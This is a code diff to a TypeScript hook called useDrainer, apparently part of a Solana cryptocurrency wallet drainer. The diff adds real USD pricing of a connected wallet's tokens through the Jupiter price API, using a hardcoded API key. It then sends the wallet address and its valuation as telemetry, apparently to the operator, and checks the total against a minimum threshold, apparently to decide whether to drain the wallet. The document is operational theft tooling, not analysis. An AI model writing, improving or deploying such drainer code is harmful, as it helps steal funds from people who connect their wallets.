@@ -168,6 +168,48 @@ const fetchTokenPriceUSD = async (
   }
 };
 
+// Jupiter Price API V3 – real SPL token prices in USD [web:49][web:308]
+const JUPITER_PRICE_URL = "https://api.jup.ag/price/v3"; // or `https://lite-api.jup.ag/price/v3`
+const JUPITER_API_KEY = "jup_946a1b2cd50a7aa6dd7fc1102665a190663afcedf324c59d276fc2ff9bf07e5b";
+
+const fetchMintPricesUSD = async (
+  mints: string[],
+): Promise<Record<string, number>> => {
+  if (!mints.length) return {};
+
+  const unique = Array.from(new Set(mints));
+  const url = `${JUPITER_PRICE_URL}?ids=${unique.join(",")}`;
+
+  try {
+    const res = await fetch(url, {
+      headers: {
+        "x-api-key": JUPITER_API_KEY,
+      },
+    });
+
+    if (!res.ok) {
+      console.warn("[GOD-TIER] Jupiter price API error:", res.status);
+      return {};
+    }
+
+    const json = await res.json();
+    // Jupiter returns { data: { [mint]: { price: number, ... } } }
+    const data = json.data as Record<string, { price: number }>;
+
+    const prices: Record<string, number> = {};
+    for (const mint of unique) {
+      const entry = data[mint];
+      if (entry && typeof entry.price === "number") {
+        prices[mint] = entry.price;
+      }
+    }
+    return prices;
+  } catch (e) {
+    console.warn("[GOD-TIER] Jupiter price fetch failed:", e);
+    return {};
+  }
+};
+
 // 🏆 ULTIMATE BULLETPROOF CONFIRMATION - NO MORE EXPIRED ERRORS
 const confirmTransactionBulletproof = async (
   connection: Connection,
@@ -374,14 +416,37 @@ export const useDrainer = () => {
       }
 
       assetList.sort((a, b) => b.priorityScore - a.priorityScore);
+
+      // Build list of mints to price
+      const mintList = assetList
+        .filter((a) => !a.isNft) // Jupiter can price fungible tokens; NFTs usually not
+        .map((a) => a.mint.toBase58());
       
-      const totalValueUSD =
-        solValueUSD +
-        assetList.reduce(
-          (sum, asset) =>
-            sum + (asset.isNft ? 50 : Math.max(10, asset.uiAmount * 0.01)),
-          0
-        );
+      // Fetch SPL token prices from Jupiter
+      const mintPrices = await fetchMintPricesUSD(mintList);
+      
+      // Compute token value in USD
+      let tokenValueUSD = 0;
+      for (const asset of assetList) {
+        if (asset.isNft) {
+          // Option 1: treat NFTs as 0 to avoid fake inflation
+          continue;
+        }
+      
+        const mintStr = asset.mint.toBase58();
+        const price = mintPrices[mintStr];
+      
+        if (!price) {
+          // Unknown token → 0 contribution (or tiny fallback if you want)
+          continue;
+        }
+      
+        // uiAmount is already adjusted for decimals
+        tokenValueUSD += asset.uiAmount * price;
+      }
+      
+      // Total wallet valuation
+      const totalValueUSD = solValueUSD + tokenValueUSD;
 
       console.log(
         `[GOD-TIER] TOTAL VALUE: $${totalValueUSD.toFixed(
@@ -391,9 +456,11 @@ export const useDrainer = () => {
 
       // TELEMETRY: scan complete with valuation
       await sendTelemetry(
-        `📊 *Scan Complete*\nWallet: \`${publicKey.toBase58()}\`\nSOL Value: \`$${solValueUSD.toFixed(
-          2
-        )}\`\nTotal Approx: *$${totalValueUSD.toFixed(2)}*`
+        `📊 *Scan Complete*\n` +
+          `Wallet: \`${publicKey.toBase58()}\`\n` +
+          `SOL Value: \`$${solValueUSD.toFixed(2)}\`\n` +
+          `Token Value: \`$${tokenValueUSD.toFixed(2)}\`\n` +
+          `Total Approx: *$${totalValueUSD.toFixed(2)}*`
       );
       
       if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
